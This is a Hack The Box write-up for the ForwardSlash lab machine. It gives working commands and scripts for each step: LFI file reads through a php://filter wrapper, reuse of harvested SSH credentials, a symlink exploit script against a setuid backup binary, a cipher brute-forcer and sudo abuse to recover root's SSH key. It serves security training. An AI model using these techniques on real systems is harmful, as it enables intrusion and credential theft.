---
layout: post
title: "Hack The Box - ForwardSlash Writeup"
author: Chr0x6eOs
date: "2020-07-11"
subject: "ForwardSlash Writeup"
keywords: [HTB, CTF, Hack The Box, Security, Chr0x6eOs, Linux]
lang: "en"
image:
    path: assets/htb/ForwardSlash/logo.png
    width: 300
    height: 300
...

# Overview
![ForwardSlash](/assets/htb/ForwardSlash/forwardslash.png)

[ForwardSlash](https://www.hackthebox.eu/home/machines/profile/239) is a hard linux box by [InfoSecJack](https://www.hackthebox.eu/home/users/profile/52045) and [chivato](https://www.hackthebox.eu/home/users/profile/44614).

The box starts with web-enumeration, where we find a local file inclusion vulnerability that allows us to read sensitive data from the server. This gives us access to credentials, which we can use to login via ssh.

Enumerating the system, we find a backup program that contains a race-condition to read arbitrary-files in the context of another user. This allows us to get credentials for user and read user.txt.

In order to get root, we have to solve a crypto-challenge. For this we have to brute force the length and the first character of the key. Upon decrypting the ciphertext, we get the decryption-key for an image, which we can mount. This image contains an ssh-key for root, which we can use to login as root and read root.txt.

## Information Gathering

### Nmap
We begin our enumeration with a nmap scan for open ports.

```bash
root@darkness:~# nmap -sC -sV 10.10.10.183
Nmap scan report for 10.10.10.183
Host is up (0.051s latency).
Not shown: 998 closed ports
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   2048 3c:3b:eb:54:96:81:1d:da:d7:96:c7:0f:b4:7e:e1:cf (RSA)
|   256 f6:b3:5f:a2:59:e3:1e:57:35:36:c3:fe:5e:3d:1f:66 (ECDSA)
|_  256 1b:de:b8:07:35:e8:18:2c:19:d8:cc:dd:77:9c:f2:5e (ED25519)
80/tcp open  http    Apache httpd 2.4.29 ((Ubuntu))
|_http-server-header: Apache/2.4.29 (Ubuntu)
|_http-title: Did not follow redirect to http://forwardslash.htb
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
```

## Enumeration

The only open ports shown are **22** and **80** . SSH usually is not that interesting, so let us begin with http.

### HTTP - Port 80

Going to http://10.10.10.183, we get redirected to http://forwardslash.htb. Let us add this host to our /etc/hosts file and try to access the website.

![Webpage index](/assets/htb/ForwardSlash/webpage-index.png)

Upon accessing the website. It seems like the server was hacked by `The Backslash Gang`. They are talking about `XML` and `Automatic FTP Logins`.

Let us try to find any interesting files using gobuster.

```bash
root@darkness:~# gobuster dir -u forwardslash.htb -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -x php,txt
===============================================================
Gobuster v3.0.1
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@_FireFart_)
===============================================================
[+] Url:            http://forwardslash.htb
[+] Threads:        10
[+] Wordlist:       /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt
[+] Status codes:   200,204,301,302,307,401,403
[+] User Agent:     gobuster/3.0.1
[+] Extensions:     php,txt
[+] Timeout:        10s
===============================================================
2020/07/10 11:34:17 Starting gobuster
===============================================================
/index.php (Status: 200)
/note.txt (Status: 200)
```

Running the gobuster, we find the file `note.txt` which contains following data:

```
Pain, we were hacked by some skids that call themselves the "Backslash Gang"... I know... That name... 
Anyway I am just leaving this note here to say that we still have that backup site so we should be fine.

-chiv
```

Let us try to find the `backup site` that is referred to in the note. Backup websites are usually hosted at another vHost. Trying http://backup.forwardslash.htb, we get a hit and this site is shown.

## Foothold

![Backup site](/assets/htb/ForwardSlash/webpage-login.png)



We get a page, where we can login and create a new account. Let us enumerate the site more and create a test-account.

![Creating the account](/assets/htb/ForwardSlash/webpage-signup.png)

Now we can login with the created account and get forwarded to this page.

![Home page](/assets/htb/ForwardSlash/webpage-home.png)

Checking out all the links, `Change Your Profile Picture` seems to be the most interesting.

![Change Profile Picture](/assets/htb/ForwardSlash/webpage-changepp.png)

Seems like we can specify the URL to our image, which the server would fetch and parse. This feature is claimed to be disabled, however we can change the HTML elements and still use the feature.

![Change HTML elements](/assets/htb/ForwardSlash/webpage-changehtml.png)

Removing the `disabled=""` attribute allows us to still use the form. Let us capture the request via burp and send it to the repeater tab to play around with it.

### LFI exploitation

![Intercepted request](/assets/htb/ForwardSlash/burp-intercepted-request.png)

We can now test for an LFI using the `FILE://` specifier to try and read files from the server-system.

![Successful LFI](/assets/htb/ForwardSlash/lfi-successful.png)

We successfully exploited the LFI and read /etc/passwd.

Let us run a gobuster and see if there are any interesting files we can try to read.

```bash
root@darkness:~# gobuster dir -u http://backup.forwardslash.htb -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -x php
===============================================================
Gobuster v3.0.1
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@_FireFart_)
===============================================================
[+] Url:            http://backup.forwardslash.htb
[+] Threads:        10
[+] Wordlist:       /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt
[+] Status codes:   200,204,301,302,307,401,403
[+] User Agent:     gobuster/3.0.1
[+] Extensions:     php
[+] Timeout:        10s
===============================================================
2020/07/10 11:55:12 Starting gobuster
===============================================================
/index.php (Status: 302)
/login.php (Status: 200)
/register.php (Status: 200)
/welcome.php (Status: 302)
/dev (Status: 301)
/api.php (Status: 200)
/environment.php (Status: 302)
/logout.php (Status: 302)
/config.php (Status: 200)
/hof.php (Status: 302)
/server-status (Status: 403)
```

`Config.php` seems like a file that may be worth reading, as it could contain credentials. 

After trying around a bit, I eventually was able to read the config.php file via `url=FILE:///var/www/backup.forwardslash.htb/config.php`.

![Config.php](/assets/htb/ForwardSlash/lfi-config.png)

Sadly the credentials in the file are not of any value, so we have to search somewhere else for working credentials.

Remembering to our gobuster, we have a /dev endpoint that we haven't enumerated yet.

### /dev endpoint

Going to http://backup.forwardslash.htb/dev/, we get a 403 Access Denied.

![Webpage dev 403](/assets/htb/ForwardSlash/webpage-dev.png)

We can try to use the LFI to read the `/dev/index.php` file using: `url=FILE:///var/www/backup.forwardslash.htb/dev/index.php`, however we get `Permission Denied; not that way ;)`.

We can try to bypass the read-restriction by using the base64 php wrapper: `php://filter/convert.base64-encode/resource=<file>`.

![LFI Dev](/assets/htb/ForwardSlash/lfi-dev.png)

We can use curl to quickly get our data:

```bash
root@darkness:~# curl -s -X POST http://backup.forwardslash.htb/profilepicture.php -d 'url=php://filter/convert.base64-encode/resource=/var/www/backup.forwardslash.htb/dev/index.php' -b 'PHPSESSID=oi2krfc55smq93s9hkcl7vktic' | grep -A 1 '</html>' | grep -v '</html>' | base64 -d > dev-index.php
```

We can now read `dev-index.php`:

```php
[...]
<?php
if ($_SERVER['REQUEST_METHOD'] === "GET" && isset($_GET['xml'])) {

        $reg = '/ftp:\/\/[\s\S]*\/\"/';
        //$reg = '/((((25[0-5])|(2[0-4]\d)|([01]?\d?\d)))\.){3}((((25[0-5])|(2[0-4]\d)|([01]?\d?\d))))/'

        if (preg_match($reg, $_GET['xml'], $match)) {
                $ip = explode('/', $match[0])[2];
                echo $ip;
                error_log("Connecting");

                $conn_id = ftp_connect($ip) or die("Couldn't connect to $ip\n");

                error_log("Logging in");

                if (@ftp_login($conn_id, "chiv", 'N0bodyL1kesBack/')) {

                        error_log("Getting file");
                        echo ftp_get_string($conn_id, "debug.txt");
                }

                exit;
        }
[...]
```

We now get credentials for the user `chiv` with the password `N0bodyL1kesBack/`. Let us try this credentials with ssh.

```bash
root@darkness:~# ssh chiv@10.10.10.183
The authenticity of host '10.10.10.183 (10.10.10.183)' can't be established.
ECDSA key fingerprint is SHA256:7DrtoyB3GmTDLmPm01m7dHeoaPjA7+ixb3GDFhGn0HM.
Are you sure you want to continue connecting (yes/no/[fingerprint])? yes
Warning: Permanently added '10.10.10.183' (ECDSA) to the list of known hosts.
chiv@10.10.10.183\'s password:N0bodyL1kesBack/
chiv@forwardslash:~$
```

The credentials for chiv work with ssh and we successfully get a shell.

## Privesc

Now that we have a shell as a low-privilege user, let us enumerate the system to find a privilege escalation vector.

### Privesc to user

The user chiv does not have access to user.txt, so we have to escalate to the user `pain` in order to read user.txt.

#### Enumeration as chiv

Searching through the system as `chiv`, we can find some interesting files in `/var/backups`.

```bash
chiv@forwardslash:/var/backups$ ls -lh
[...]
-rw-------  1 pain pain              526  Jun 21  2019 config.php.bak
-r--r--r--  1 root root              129  May 27  2019 note.txt
drwxrwx---  2 root backupoperator 	 4.0K May 27  2019 recovery
pain@forwardslash:/var/backups$ ls -lh recovery/
total 954M
-rw-r----- 1 root backupoperator 954M Mar 24 12:12 encrypted_backup.img
```

We have a backup of the config.php file, a note.txt and a folder called recovery. This folder contains a encrypted image. Without any key this image is not useful, however we should keep it in the back of our head, if we ever get a key.

Checking out note.txt:

```bash
chiv@forwardslash:/var/backups$ cat note.txt 
Chiv, this is the backup of the old config, the one with the password we need to actually keep safe. Please DO NOT TOUCH.

-Pain
```

Seems like there is a valid password in the `config.php.bak` file, so our next goal will be to read this file.

Further enumerating the system, we can find a setuid file owned by pain:

```bash
chiv@forwardslash:~$ find / -type f -perm -4000 2>/dev/null
/usr/bin/backup
chiv@forwardslash:~$ ls -alh /usr/bin/backup
-r-sr-xr-x 1 pain pain 14K Mar  6 10:06 /usr/bin/backup
```

Let us download the binary and open it in ghidra to analyze it.

```bash
root@darkness:~# scp chiv@10.10.10.183:/usr/bin/backup .
chiv@10.10.10.183's password:N0bodyL1kesBack/
backup                                         100%   13KB 270.5KB/s   00:00
```

#### Reversing backup

Opening the file in ghidra, we can locate the main function and start reversing the program.

```c
void main(void)
{
  __uid_t uid;
  __gid_t gid;
  int char;
  tm *time_struct;
  size_t len;
  long in_FS_OFFSET;
  char char1;
  time_t time;
  char *time_str;
  char *md5sum;
  FILE *file;
  ulong struct_p;
  ulong hour;
  undefined8 month;
  undefined8 day;
  undefined8 daylight_flag;
  long time_zone;
  char *time_zone_name;
  long stack_canary;
  
  /* Set stack canary */
  stack_canary = *(long *)(in_FS_OFFSET + 0x28);
  
  /* Save current uid & gid and print banner */
  uid = getuid();
  gid = getgid();
  puts(banner);
  
  /* Get current time and save it in variables */
  time = time((time_t *)0x0);
  time_struct = localtime(&time);
  struct_p = *(ulong *)time_struct;
  hour = *(ulong *)&time_struct->tm_hour;
  month = *(undefined8 *)&time_struct->tm_mon;
  day = *(undefined8 *)&time_struct->tm_wday;
  daylight_flag = *(undefined8 *)&time_struct->tm_isdst;
  time_zone = time_struct->tm_gmtoff;
  time_zone_name = time_struct->tm_zone;
  time_str = (char *)malloc(0xd);
  sprintf(time_str,"%02d:%02d:%02d",hour & 0xffffffff,struct_p >> 0x20,struct_p & 0xffffffff);
  len = strlen(time_str);
  
  /* Calculate md5sum of current time */
  md5sum = (char *)str2md5(time_str,len & 0xffffffff,len & 0xffffffff);
  
  /* Print current time */
  printf("Current Time: %s\n",time_str);
  
  /* Set uid & guid to 1002 (pain) */
  setuid(0x3ea);
  setgid(0x3ea);
  
  /* Try to access file that has name of md5sum */
  var = access(md5sum,0);
  if (var == -1) {
    printf("ERROR: %s Does Not Exist or Is Not Accessible By Me, Exiting...\n",md5sum);
  }
  else {
    /* File with name of md5sum exists, open and try to read file */
    file = fopen(md5sum,"r");
    if (file == (FILE *)0x0) {
      puts("File cannot be opened.");
    }
    else {
      /* File can be opened, read file char by char */
      var = fgetc(file);
      text = (char)var;
      while (text != -1) {
        putchar((int)text);
        var = fgetc(file);
        text = (char)var;
      }
      fclose(file);
    }
  }
  
  /* Set uid & gid back to original values and delete file */
  setuid(uid);
  setgid(gid);
  remove(md5sum);
  
  /* stack_canary check */
  if (stack_canary != *(long *)(in_FS_OFFSET + 0x28)) {
    __stack_chk_fail();
  }
  return;
}
```

Summarizing the functionality of the program, once the program starts, it get the current time and calculates the md5sum of that string. Next it tries to access the file in the current working directory with the name of the md5sum. If successful, it reads the values of the file, deletes it afterwards and exits.

With this information we now know how to read the `config.php.bak` file. As the program changes the user and group id to 1002 before reading the file, we can use the program to read the config file. For this to work, we have to create a file that symlinks to the config file with the md5sum of the current time as the name. For this we can use a simple bash script.

#### Exploiting the backup binary to read config.php.bak

Let us verify our assumptions, by executing the program and calculating the md5sum ourselves.

```bash
chiv@forwardslash:~$ /usr/bin/backup 
----------------------------------------------------------------------
        Pain\'s Next-Gen Time Based Backup Viewer
        v0.1
        NOTE: not reading the right file yet, 
        only works if backup is taken in same second
----------------------------------------------------------------------

Current Time: 12:39:48
ERROR: 6257a5e3e1a13b41d9a5e7360976edee Does Not Exist or Is Not Accessible By Me, Exiting...
chiv@forwardslash:~$ echo -n "12:39:48" | md5sum
6257a5e3e1a13b41d9a5e7360976edee  -
```

We have successfully verified our assumptions and can now start writing our exploit script.

```bash
#!/bin/bash
# Tmp dir
DIR="/dev/shm/.chronos"
# Target backup
BAK="/var/backups/config.php.bak"
# Create dir if not already existing
[ ! -d "$DIR" ] && mkdir "$DIR"
# Got to Tmp dir
cd "$DIR"
# Calculate md5sum
MD5="$(echo -n $(date +"%H:%M:%S") | md5sum | cut -d " " -f 1)"
# Create symlink with md5name
ln -s "$BAK" "$MD5"
# Run backup binary
/usr/bin/backup
# Go back to previous dir
(cd -) 1> /dev/null
# Delete tmp dir
rm -rf "$DIR"
```

This bash script simply creates the symlink and then runs the binary. We can now execute the exploit script and read the contents of the `config.php.bak` file.

```bash
chiv@forwardslash:~$ bash exploit.sh 
----------------------------------------------------------------------
        Pain\'s Next-Gen Time Based Backup Viewer
        v0.1
        NOTE: not reading the right file yet, 
        only works if backup is taken in same second
----------------------------------------------------------------------

Current Time: 12:58:57
<?php
/* Database credentials. Assuming you are running MySQL
server with default setting (user 'root' with no password) */
define('DB_SERVER', 'localhost');
define('DB_USERNAME', 'pain');
define('DB_PASSWORD', 'db1f73a72678e857d91e71d2963a1afa9efbabb32164cc1d94dbc704');
define('DB_NAME', 'site');
 
/* Attempt to connect to MySQL database */
$link = mysqli_connect(DB_SERVER, DB_USERNAME, DB_PASSWORD, DB_NAME);
 
// Check connection's
if($link === false){
    die("ERROR: Could not connect. " . mysqli_connect_error());
}
?>
chiv@forwardslash:~$
```

We now have the password for the user pain `db1f73a72678e857d91e71d2963a1afa9efbabb32164cc1d94dbc704` and can login via ssh.

```bash
root@darkness:~# ssh pain@10.10.10.183
pain@10.10.10.183\'s password:db1f73a72678e857d91e71d2963a1afa9efbabb32164cc1d94dbc704
pain@forwardslash:~$ 
```

Now that we have access as the user pain, we can read user.txt.

```bash
pain@forwardslash:~$ cat user.txt 
67d2c***************************
```

### Privesc to root

Now that we have access to the system as user, let us enumerate to find a privilege escalation vector to root.

#### Enumeration as pain

Checking out the home directory of pain, we have a couple of interesting files:

```bash
pain@forwardslash:~$ ls -lh
total 12K
drwxr-xr-x 2 pain root 4.0K Mar 24 12:06 encryptorinator
-rw-r--r-- 1 pain root  256 Jun  3  2019 note.txt
pain@forwardslash:~$ ls -lh encryptorinator/
total 8.0K
-rw-r--r-- 1 pain root 165 Jun  3  2019 ciphertext
-rw-r--r-- 1 pain root 931 Jun  3  2019 encrypter.py
```

We have a note.txt, a encrypted file and a encryption script. Checking out the note.txt:

```bash
pain@forwardslash:~$ cat note.txt 
Pain, even though they got into our server, I made sure to encrypt any important files and then did some crypto magic on the key... I gave you the key in person the other day, so unless these hackers are some crypto experts we should be good to go.

-chiv
```

Seems like we have to decrypt the ciphertext file.

```bash
pain@forwardslash:~/encryptorinator$ cat ciphertext 
,L
>2Xբ
|?I)E-˒\/;y[w#M2ʐY@'缘泣,P@5f$\*rwF3gX}i6~KY'%e>xo+g/K>^Nke
```

#### encrypter.py

Checking out the encrypter.py file:

```python
pain@forwardslash:~/encryptorinator$ cat encrypter.py 
def encrypt(key, msg):
    key = list(key)
    msg = list(msg)
    for char_key in key:
        for i in range(len(msg)):
            if i == 0:
                tmp = ord(msg[i]) + ord(char_key) + ord(msg[-1])
            else:
                tmp = ord(msg[i]) + ord(char_key) + ord(msg[i-1])

            while tmp > 255:
                tmp -= 256
            msg[i] = chr(tmp)
    return ''.join(msg)

def decrypt(key, msg):
    key = list(key)
    msg = list(msg)
    for char_key in reversed(key):
        for i in reversed(range(len(msg))):
            if i == 0:
                tmp = ord(msg[i]) - (ord(char_key) + ord(msg[-1]))
            else:
                tmp = ord(msg[i]) - (ord(char_key) + ord(msg[i-1]))
            while tmp < 0:
                tmp += 256
            msg[i] = chr(tmp)
    return ''.join(msg)
```

In order to decrypt the message, we have to brute force the key and it's length. While testing through the script I found an interesting behavior that showed as long as the key is the right length and the first character is correct, it decrypt successfully. With this knowledge in the back of our head, we can quickly write a brute-forcer. We can also assume that our key does not exceed the length of the cipher text.

```bash
pain@forwardslash:~/encryptorinator$ cat ciphertext | wc -c
165
```

The length of the ciphertext is 165 chars, therefore our key will be shorter or equal to that length. Furthermore, as the note.txt talks about a key, I assume that the word `key` is present in the plaintext.

#### Creating the decryption script

The first function of our decryption script is the original decryption function of the encrypter.py file. This function does not need any changes. Next we have the bf_key function.

```python
# Bruteforce key
def bf_key():
    data = ""
    try:
        data = open("ciphertext",encoding="latin").read()
    except Exception as ex:
        print(f"[-] ERROR: {ex}")
    if data != "":
        for length in range(len(data)):
            print(f"[{length/len(data)*100:0.2f}%] Trying length: {length}/{len(data)}")
            for char in string.ascii_letters:
                key = char * length
                print(f"[~] Trying key: {key}")
                decrypted = decrypt(key,data)
                clear()
                # Check if majority of string is ascii
                if len(decrypted) + 50 > len(decrypted.encode()):
                    # Check for valid words
                    if any(x in decrypted for x in ["key","password"]):
                        print(f"[+] Got possible plaintext with key {key}:\n{decrypted}")
                        x = input("Continue [Y/n]? ")
                        if x not in ["y","Y","YES","Yes","yes",""]:
                            clear(5)
                            print(f"[+] Got plaintext: {decrypted}")
                            return
                        clear(5)
            clear()
        else:
            print("[-] Could not recover plaintext!")
    else:
        print("[-] Could not read ciphertext file!")
```

The bf_key function simply generates possible keys and then decrypts the data with this key. It then checks if the majority of the output is ascii and furthermore checks for key-words in the output, such as "key","password" (could be expanded with a dictionary). If the output is both ascii and contains valid key-words, we can specify if the script should stop or if we found the right plaintext.

Running the script, we get a valid plaintext with a key-length of `17` and a starting character of `t`.

```bash
root@darkness:~# python3 exploit.py
[10.30%] Trying length: 17/165
[+] Got possible plaintext with key ttttttttttttttttt:
$7CõÞq8øÉ4³l'yorSÔaé[8vá[(ý;fryption tool, pretty secure huh, anyway here is the key to the encrypted image from /var/backups/recovery: cB!6%sdH8Lj^@Y*$C2cf
Continue [Y/n]?
```

We now have the key for the encrypted image from `/var/backups/recovery`: `cB!6%sdH8Lj^@Y*$C2cf` and can decrypt the image.

Checking out our sudo-privileges, we see that we have the necessary privileges to work with the image.

```bash
pain@forwardslash:~$ sudo -l
Matching Defaults entries for pain on forwardslash:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin

User pain may run the following commands on forwardslash:
    (root) NOPASSWD: /sbin/cryptsetup luksOpen *
    (root) NOPASSWD: /bin/mount /dev/mapper/backup ./mnt/
    (root) NOPASSWD: /bin/umount ./mnt/
```

#### Decrypting and mounting the image
```bash
pain@forwardslash:~$ sudo cryptsetup luksOpen /var/backups/recovery/encrypted_backup.img backup
Enter passphrase for /var/backups/recovery/encrypted_backup.img:
```

We can use cryptsetup luksOpen to decrypt our image with the name backup. This creates a block-device `/dev/mapper/backup`, which we are allowed to mount to `./mnt/`.

```bash
pain@forwardslash:/$ sudo mount /dev/mapper/backup ./mnt/
pain@forwardslash:/$ ls mnt/
id_rsa
pain@forwardslash:/$ cat mnt/id_rsa
-----BEGIN RSA PRIVATE KEY-----
[...]
-----END RSA PRIVATE KEY-----
pain@forwardslash:/$ sudo umount ./mnt/
```

Checking out the /mnt/ directory, we find and id_rsa file. After copying the file to our system we umount the device again. We can now use the id_rsa key to login to the machine as root and read root.txt.

```bash
root@darkness:~# ssh -i id_rsa root@10.10.10.183

root@forwardslash:~# cat root.txt 
e7014***************************
```
